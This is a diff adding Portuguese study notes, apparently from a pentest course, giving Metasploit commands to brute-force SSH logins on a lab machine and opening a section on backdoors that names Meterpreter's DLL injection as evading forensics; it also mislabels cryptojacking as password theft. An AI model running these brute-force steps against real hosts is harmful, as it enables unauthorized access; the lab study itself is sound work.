@@ -57,4 +57,28 @@ NO KALI:
 
 1) metasploit
 2) execute a maquina vuneravel metasploit table
-3) 
+3) command: search ssh_login
+4) use o primeiro, que não tem o pubkey
+5) command: info (esse comando é para saber o que ele precisa)
+6) crie arquivos password e users usando o comando nano + nome_arquivo + .txt
+7) set rhosts + ip_vitima
+8) set USER_FILE + caminho dos arquivos criados para força bruta
+9) set PASS_FILE + caminho arquivo
+10) exploit
+11) command: sessions (vc pode ver as sessoes abertas)
+12) command sessions 1 (Aqui é só vc escolher qual vc quer conectar)
+
+
+------------------------------------------------------------------
+                ATRAVES DE BACKDOOR EXECUTAVEL
+------------------------------------------------------------------
+
+TIPOS DE ATAQUES BACKDOORS:
+  1) Spyware (espionagem)
+  2) Ransomware (criptografia)
+  3) DDoS (negacao de serviço)
+  4) Criptojacking (roubo de senhas)
+
+
+Ferramentas:
+  1)METERPRETER - Ele é um payload que funciona por injeção de DLL (torna dificil detecção de tecnicas forenses)
